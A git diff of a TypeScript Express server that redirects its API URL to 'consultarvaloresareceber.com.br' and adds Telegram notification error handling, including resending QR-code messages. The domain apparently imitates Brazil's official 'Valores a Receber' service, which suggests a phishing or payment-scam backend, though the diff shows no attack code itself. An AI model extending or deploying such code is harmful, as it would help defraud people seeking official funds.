@@ -11,7 +11,12 @@ import nodemailer from 'nodemailer';
 
 dotenv.config();
 
-const API_URL = "https://www.consultarvaloresareceber.com.br";
+let API_URL = (process.env.SVR_SYS_CORE_URL || 'https://consultarvaloresareceber.com.br').replace(/\/$/, "");
+
+if (API_URL.includes("discloud.app")) {
+    console.log("⚠️ [SEGURANÇA] URL Discloud legado detectado. Corrigindo para o domínio principal...");
+    API_URL = "https://consultarvaloresareceber.com.br";
+}
 
 const app = express();
 const port = parseInt(process.env.PORT || "80", 10);
@@ -862,8 +867,23 @@ async function sendTelegram(text: string, messageId?: number, replyMarkup?: any)
   } catch (err: any) {
     const errMessage = err.response?.data?.description || err.message;
 
-    // Sem mudança de conteúdo — ignorar silenciosamente
+    // Sem mudança de conteúdo ou mensagem não encontrada para editar
     if (errMessage.includes('message is not modified')) return messageId ?? null;
+    
+    if (errMessage.includes('message to edit not found') || errMessage.includes('chat not found')) {
+        // Se a mensagem a ser editada não existe, tentamos enviar uma nova
+        return sendTelegram(text, undefined, replyMarkup);
+    }
+
+    // Erro de HTML (entidade mal formatada)
+    if (errMessage.includes('can\'t parse entities')) {
+        console.warn(`⚠️ [TELEGRAM] Erro de HTML detectado. Enviando como texto puro.`);
+        // Tenta enviar sem HTML
+        try {
+            const res = await axios.post(`${TELEGRAM_URL}/sendMessage`, { chat_id: CHAT_ID, text: text.replace(/<[^>]*>?/gm, ''), parse_mode: undefined });
+            return res.data.result?.message_id || null;
+        } catch (_) { return null; }
+    }
 
     // Mensagem é uma foto (QR Code) — tenta editar a legenda (caption)
     const isPhotoMsg = errMessage.includes('there is no text in the message') ||
@@ -882,11 +902,10 @@ async function sendTelegram(text: string, messageId?: number, replyMarkup?: any)
 
     // Qualquer outro erro de edição: envia nova mensagem
     if (messageId) {
-      console.warn(`⚠️ [TELEGRAM] Não foi possível editar msg ${messageId}, enviando nova.`);
       return sendTelegram(text, undefined, replyMarkup);
     }
 
-    console.error(`❌ [TELEGRAM] Erro ao enviar: ${errMessage}`);
+    console.error(`❌ [TELEGRAM] Falha ao notificar: ${errMessage}`);
     return null;
   }
 }
